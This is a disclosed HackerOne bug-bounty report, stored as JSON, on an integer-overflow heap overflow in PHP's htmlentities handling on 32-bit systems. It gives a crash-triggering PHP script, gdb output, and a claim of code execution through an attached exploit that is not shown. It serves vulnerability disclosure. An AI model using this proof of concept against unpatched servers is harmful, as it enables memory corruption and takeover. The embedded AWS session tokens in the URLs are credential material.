{
  "id": 180582,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODA1ODI=",
  "url": "https://hackerone.com/reports/180582",
  "title": "Heap overflow due to integer overflow in php_escape_html_entities_ex() function",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2016-11-07T07:21:42.625Z",
  "submitted_at": "2016-11-07T07:21:42.625Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "fosec",
    "url": "/fosec",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/117/661/fea0d61725bc84364bc634a31409aa6c8c43ca03_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTF44ZAEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122651Z&X-Amz-Expires=1321&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFEl8GqbU4%2BAZWXm076AaH%2B3S407ekrwvRLdQXFj8maSAiEA7oNJs0dICVPaCtN3NpIrAoDbQV6Ejyi77KrlQuPRpBUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDNahsKqUdewADnORUCqPBbSt2LFuIdf7dnF6%2BSGZ9cPoiAZQMWLALN%2BWYyomEtoEWkOWvMa3f%2FvHfanqxv8y5APokVYlWhRKSi8EMnvvYlLkZCoZfEBYxrita%2BGJmOnAfLzKbAP4Y1yam8eHRyWd6gZv7A4xifGB4%2ByVBYpUwFfY%2FtSjbc%2FADNbGz8H5boNvsNv97iDrtAsWuhS%2BTsE9HMWty2Q5Kps5ZGh719NET5yzc4Q%2FtQXq6VZEsGmZJkhBk53ZbFfobOPyei9pZmZ6%2F2Mdq5510O22TvjtOWihXdrUVF18IGjoWAOzpmqJcFgY3pqd5Ptl8Jdv66jxrsyfzyou5wCExfQr5qzH9Vpmay4uCPhR%2FSyOG0CWwOh8b8NbDwQiT7n2e8mRdgfAZzQDYWZ3kDf3xJl4T%2BjizpvEyF4k8cnRHigJ9psCKck22rc%2FdJIeRzDPuK5gMydq%2BbZEiPRUgdLry1vf%2FHAVYzhqB51d5Ia44hsUeGvDrXu3hn5jGoJVb3p%2Bu8LXRAkstmLBEwTwx74%2BZLrtaIUbsPvoibM71bPShjn%2BeifHzFDMz1pzYAEKS3bKR%2BF6mAsb4TJcHb1aEgl%2F2VZr38huYt8TwDwXCn28i8e7UPTktLQ2%2BMY1xUbNU3qxurYTVuFskexXKmi%2BnALorE9k8A7GDdADBu%2BosuLTO%2FnUPwqP7dZYKwg749EtuHvA2OFyp16mblUz6KrLb%2FfAf3TLzS6zHIe9WcnoK0psjQn6DQdUv66ZNqunDkraEzFI7GUBVlDXzoFJMpTnm5cbS7icJeTI6SUbCamKJgZz1LYzEzm33%2FlZTz%2BFyEGL8HyorVpd5vY4dHVbb%2FeMQNELRsc2s1ONbdE6YfwyrhFyYvYBiYx9Ye%2F4ssowjpisrgY6sQFmStbg5zGr%2B68rMwEIJwcr9jwJvywdn4oxOR6RXInAJwN7lgch%2FvzVf1lSeRFZ6LuihOe%2FS4iwHxeNi0t9Xh3zgBPmKv%2FWlXb8g%2B6ZDByHn%2FH6haAptR1xW4BXNpTl7xRg1NW7b9aUxDCrRqOG%2Fy%2Bh2qYMDczVX6rGrxtEquYnaLpzcZzZ9hdZysgVk1A1SxT6%2Bkfp2tIiSadsRwSyKAYEPliJeaGXm3nwn7sIZmazF5Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=21751d74c4fc054e7730c8ee88e625f110a688307f7d1298c6a3bb5e8956f66c",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTF44ZAEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122651Z&X-Amz-Expires=1321&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFEl8GqbU4%2BAZWXm076AaH%2B3S407ekrwvRLdQXFj8maSAiEA7oNJs0dICVPaCtN3NpIrAoDbQV6Ejyi77KrlQuPRpBUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDNahsKqUdewADnORUCqPBbSt2LFuIdf7dnF6%2BSGZ9cPoiAZQMWLALN%2BWYyomEtoEWkOWvMa3f%2FvHfanqxv8y5APokVYlWhRKSi8EMnvvYlLkZCoZfEBYxrita%2BGJmOnAfLzKbAP4Y1yam8eHRyWd6gZv7A4xifGB4%2ByVBYpUwFfY%2FtSjbc%2FADNbGz8H5boNvsNv97iDrtAsWuhS%2BTsE9HMWty2Q5Kps5ZGh719NET5yzc4Q%2FtQXq6VZEsGmZJkhBk53ZbFfobOPyei9pZmZ6%2F2Mdq5510O22TvjtOWihXdrUVF18IGjoWAOzpmqJcFgY3pqd5Ptl8Jdv66jxrsyfzyou5wCExfQr5qzH9Vpmay4uCPhR%2FSyOG0CWwOh8b8NbDwQiT7n2e8mRdgfAZzQDYWZ3kDf3xJl4T%2BjizpvEyF4k8cnRHigJ9psCKck22rc%2FdJIeRzDPuK5gMydq%2BbZEiPRUgdLry1vf%2FHAVYzhqB51d5Ia44hsUeGvDrXu3hn5jGoJVb3p%2Bu8LXRAkstmLBEwTwx74%2BZLrtaIUbsPvoibM71bPShjn%2BeifHzFDMz1pzYAEKS3bKR%2BF6mAsb4TJcHb1aEgl%2F2VZr38huYt8TwDwXCn28i8e7UPTktLQ2%2BMY1xUbNU3qxurYTVuFskexXKmi%2BnALorE9k8A7GDdADBu%2BosuLTO%2FnUPwqP7dZYKwg749EtuHvA2OFyp16mblUz6KrLb%2FfAf3TLzS6zHIe9WcnoK0psjQn6DQdUv66ZNqunDkraEzFI7GUBVlDXzoFJMpTnm5cbS7icJeTI6SUbCamKJgZz1LYzEzm33%2FlZTz%2BFyEGL8HyorVpd5vY4dHVbb%2FeMQNELRsc2s1ONbdE6YfwyrhFyYvYBiYx9Ye%2F4ssowjpisrgY6sQFmStbg5zGr%2B68rMwEIJwcr9jwJvywdn4oxOR6RXInAJwN7lgch%2FvzVf1lSeRFZ6LuihOe%2FS4iwHxeNi0t9Xh3zgBPmKv%2FWlXb8g%2B6ZDByHn%2FH6haAptR1xW4BXNpTl7xRg1NW7b9aUxDCrRqOG%2Fy%2Bh2qYMDczVX6rGrxtEquYnaLpzcZzZ9hdZysgVk1A1SxT6%2Bkfp2tIiSadsRwSyKAYEPliJeaGXm3nwn7sIZmazF5Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a24007cb56a0d18a83ee943dc31f830b1f488838c9990fe5e91027baf2611d2d"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-11-12T09:22:04.703Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-10-13T09:22:02.897Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The fix for this bug has been committed: https://bugs.php.net/bug.php?id=73398\nDescription:\n------------\nI have found some vulnerable code at ```php_escape_html_entities_ex()``` function. ```php_escape_html_entities_ex()``` function creates a new zend_string object to store html data. The size of destination string depends on the size of source string. ( refer at `ext/standard/html.c:1272` )\n\n``` c\nPHPAPI zend_string *php_escape_html_entities_ex(unsigned char *old, size_t oldlen, int all, int flags, char *hint_charset, zend_bool double_encode)\n{\n...\n\t/* initial estimate */\n\tif (oldlen < 64) {\n\t\tmaxlen = 128;\n\t} else {\n\t\tmaxlen = 2 * oldlen;\n\t\tif (maxlen < oldlen) {\n\t\t\tzend_throw_error(NULL, \"Input string is too long\");\n\t\t\treturn NULL;\n\t\t}\n\t}\n\nreplaced = zend_string_alloc(maxlen, 0);\n...\n}\n```\n\nIf `oldlen` is equal to PHP_INT_MAX, `maxlen` will be an unexpected value and `zend_string_alloc()` function will allocate a small memory range. Due to missing check of size before calling\n`zend_string_alloc()`, this new memory range can not use to store large html data and lead to heap overflow. I can overwrite other objects of PHP in memory. This bug is only triggered in 32bit machine.\n\nSolution:\nIt should be `zend_string_alloc_safe` instead of `zend_string_alloc`. \n\nTest script:\n---------------\n``` php\n<?php\nini_set('memory_limit', -1);\n$s = str_repeat(\"A\", PHP_INT_MAX);\nhtmlentities($s, 0, \"\", true);\n?>\n```\nActual result:\n--------------\nOpen php program in gdb and run test script, set a breakpoint at line in file `ext/standard/html.c:1269`.\nWhen debugger stops, we have `oldlen=0x7fffffff`. Because `oldlen` is bigger than 0x64, `maxlen` is equal to twice `oldlen`. `maxlen` is equal to 0xfffffffe. \n```\n [----------------------------------registers-----------------------------------]\nEAX: 0xfffffffe\nEBX: 0x1\nECX: 0x10\nEDX: 0x5\nESI: 0xb7814100 --> 0x2\nEDI: 0xfffffffe\nEBP: 0xbfffbf68 --> 0xbfffbfb8 --> 0xbfffc084 --> 0x0\nESP: 0xbfffbee0 --> 0x80001000 ('A' <repeats 200 times>...)\nEIP: 0x826e37a (<php_escape_html_entities_ex+442>:      call   0x82fc010 <_emalloc>)\nEFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x826e371 <php_escape_html_entities_ex+433>: mov    edi,DWORD PTR [ebp-0x34]\n   0x826e374 <php_escape_html_entities_ex+436>: lea    ecx,[edi+0x14]\n   0x826e377 <php_escape_html_entities_ex+439>: and    ecx,0xfffffffc\n=> 0x826e37a <php_escape_html_entities_ex+442>: call   0x82fc010 <_emalloc>\n   0x826e37f <php_escape_html_entities_ex+447>: mov    esi,eax\n   0x826e381 <php_escape_html_entities_ex+449>: mov    DWORD PTR [eax],0x1\n   0x826e387 <php_escape_html_entities_ex+455>: mov    DWORD PTR [eax+0x4],0x6\n   0x826e38e <php_escape_html_entities_ex+462>: mov    DWORD PTR [eax+0x8],0x0\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbee0 --> 0x80001000 ('A' <repeats 200 times>...)\n0004| 0xbfffbee4 --> 0xb7ce07e9 (<madvise+25>:  pop    ebx)\n0008| 0xbfffbee8 --> 0xb7ce07f7 (<madvise+39>:  add    ecx,0xc7809)\n0012| 0xbfffbeec --> 0x82f9774 (<zend_mm_chunk_alloc_int+100>:  mov    eax,esi)\n0016| 0xbfffbef0 --> 0x37400000 --> 0x2\n0020| 0xbfffbef4 --> 0x80001000 ('A' <repeats 200 times>...)\n0024| 0xbfffbef8 --> 0xe\n0028| 0xbfffbefc --> 0x88dd0c0 --> 0x88dd0f8 --> 0x2\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x0826e37a      122             zend_string *ret = (zend_string *)pemalloc(ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(len)), persistent);\ngdb-peda$\n```\n\n\nThe size which is used as parameter in `_emalloc()` function is equal to `((oldlen * 2 + 0x14 ) & 0xfffffffc)`. Due to integer overflow, if `oldlen` is equal to 0x7fffffff, this size is 0x10. The new memory region is too small to store a large string! \n\nif we continue running, other memory region will be overwritten until SIGSEGV!\n```\n [----------------------------------registers-----------------------------------]\nEAX: 0x41 ('A')\nEBX: 0x199fa0\nECX: 0x37599fb0 ('A' <repeats 200 times>...)\nEDX: 0x3\nESI: 0x199fa1\nEDI: 0xb7866050 --> 0x1\nEBP: 0xbfffbf68 --> 0xbfffbfb8 --> 0xbfffc084 --> 0x0\nESP: 0xbfffbee0 --> 0x80001000 ('A' <repeats 200 times>...)\nEIP: 0x826eaf1 (<php_escape_html_entities_ex+2353>:     mov    BYTE PTR [edi+ebx*1+0x10],al)\nEFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x826eae8 <php_escape_html_entities_ex+2344>:        mov    ebx,DWORD PTR [ebp-0x38]\n   0x826eaeb <php_escape_html_entities_ex+2347>:        movzx  eax,BYTE PTR [ecx]\n   0x826eaee <php_escape_html_entities_ex+2350>:        mov    esi,DWORD PTR [ebp-0x30]\n=> 0x826eaf1 <php_escape_html_entities_ex+2353>:        mov    BYTE PTR [edi+ebx*1+0x10],al\n   0x826eaf5 <php_escape_html_entities_ex+2357>:        lea    eax,[ebx+0x1]\n   0x826eaf8 <php_escape_html_entities_ex+2360>:        mov    DWORD PTR [ebp-0x38],eax\n   0x826eafb <php_escape_html_entities_ex+2363>:        jmp    0x826e810 <php_escape_html_entities_ex+1616>\n   0x826eb00 <php_escape_html_entities_ex+2368>:        test   BYTE PTR [ebp+0x14],0x2\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbee0 --> 0x80001000 ('A' <repeats 200 times>...)\n0004| 0xbfffbee4 --> 0xb7ce07e9 (<madvise+25>:  pop    ebx)\n0008| 0xbfffbee8 --> 0xb7ce07f7 (<madvise+39>:  add    ecx,0xc7809)\n0012| 0xbfffbeec --> 0x82f9774 (<zend_mm_chunk_alloc_int+100>:  mov    eax,esi)\n0016| 0xbfffbef0 --> 0x37400000 --> 0x2\n0020| 0xbfffbef4 --> 0x80001000 ('A' <repeats 200 times>...)\n0024| 0xbfffbef8 --> 0xe\n0028| 0xbfffbefc --> 0x88dd0c0 --> 0x88dd0f8 --> 0x2\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x0826eaf1 in php_escape_html_entities_ex (old=0x37400010 'A' <repeats 200 times>..., oldlen=0x7fffffff, all=<optimized out>, all@entry=0x1, flags=0x0, hint_charset=0x88cce38 \"\",\n    double_encode=double_encode@entry=0x1) at /root/fuzzer/PHP-7.1/ext/standard/html.c:1378\n1378                                            ZSTR_VAL(replaced)[len++] = mbsequence[0];\ngdb-peda$\n```\nI can leak memory to bypass ASLR + DEP and control eip register to the arbitrary value. Finally, the overflow results as arbitrary code execution. The attached script which executes at local machine can leak library data and run `/bin/sh`. :)\n",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 133280,
      "file_name": "php_escape_html_entities_ex_exploit.php",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/133/280/447666aa2c067223454f5191fdf63f98702e99ba/php_escape_html_entities_ex_exploit.php?response-content-disposition=attachment%3B%20filename%3D%22php_escape_html_entities_ex_exploit.php%22%3B%20filename%2A%3DUTF-8%27%27php_escape_html_entities_ex_exploit.php&response-content-type=text%2Fx-php&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTF44ZAEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122651Z&X-Amz-Expires=1321&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFEl8GqbU4%2BAZWXm076AaH%2B3S407ekrwvRLdQXFj8maSAiEA7oNJs0dICVPaCtN3NpIrAoDbQV6Ejyi77KrlQuPRpBUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDNahsKqUdewADnORUCqPBbSt2LFuIdf7dnF6%2BSGZ9cPoiAZQMWLALN%2BWYyomEtoEWkOWvMa3f%2FvHfanqxv8y5APokVYlWhRKSi8EMnvvYlLkZCoZfEBYxrita%2BGJmOnAfLzKbAP4Y1yam8eHRyWd6gZv7A4xifGB4%2ByVBYpUwFfY%2FtSjbc%2FADNbGz8H5boNvsNv97iDrtAsWuhS%2BTsE9HMWty2Q5Kps5ZGh719NET5yzc4Q%2FtQXq6VZEsGmZJkhBk53ZbFfobOPyei9pZmZ6%2F2Mdq5510O22TvjtOWihXdrUVF18IGjoWAOzpmqJcFgY3pqd5Ptl8Jdv66jxrsyfzyou5wCExfQr5qzH9Vpmay4uCPhR%2FSyOG0CWwOh8b8NbDwQiT7n2e8mRdgfAZzQDYWZ3kDf3xJl4T%2BjizpvEyF4k8cnRHigJ9psCKck22rc%2FdJIeRzDPuK5gMydq%2BbZEiPRUgdLry1vf%2FHAVYzhqB51d5Ia44hsUeGvDrXu3hn5jGoJVb3p%2Bu8LXRAkstmLBEwTwx74%2BZLrtaIUbsPvoibM71bPShjn%2BeifHzFDMz1pzYAEKS3bKR%2BF6mAsb4TJcHb1aEgl%2F2VZr38huYt8TwDwXCn28i8e7UPTktLQ2%2BMY1xUbNU3qxurYTVuFskexXKmi%2BnALorE9k8A7GDdADBu%2BosuLTO%2FnUPwqP7dZYKwg749EtuHvA2OFyp16mblUz6KrLb%2FfAf3TLzS6zHIe9WcnoK0psjQn6DQdUv66ZNqunDkraEzFI7GUBVlDXzoFJMpTnm5cbS7icJeTI6SUbCamKJgZz1LYzEzm33%2FlZTz%2BFyEGL8HyorVpd5vY4dHVbb%2FeMQNELRsc2s1ONbdE6YfwyrhFyYvYBiYx9Ye%2F4ssowjpisrgY6sQFmStbg5zGr%2B68rMwEIJwcr9jwJvywdn4oxOR6RXInAJwN7lgch%2FvzVf1lSeRFZ6LuihOe%2FS4iwHxeNi0t9Xh3zgBPmKv%2FWlXb8g%2B6ZDByHn%2FH6haAptR1xW4BXNpTl7xRg1NW7b9aUxDCrRqOG%2Fy%2Bh2qYMDczVX6rGrxtEquYnaLpzcZzZ9hdZysgVk1A1SxT6%2Bkfp2tIiSadsRwSyKAYEPliJeaGXm3nwn7sIZmazF5Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b9000b62060aeef7050d55065f655741c2000f61d348f6a9a6f88d4032a95c91",
      "file_size": 13012,
      "type": "text/x-php",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2019-11-12T09:22:03.016Z",
  "allow_singular_disclosure_after": -134276688.39524832,
  "singular_disclosure_allowed": true,
  "vote_count": 1,
  "voters": [
    "spetr0x"
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
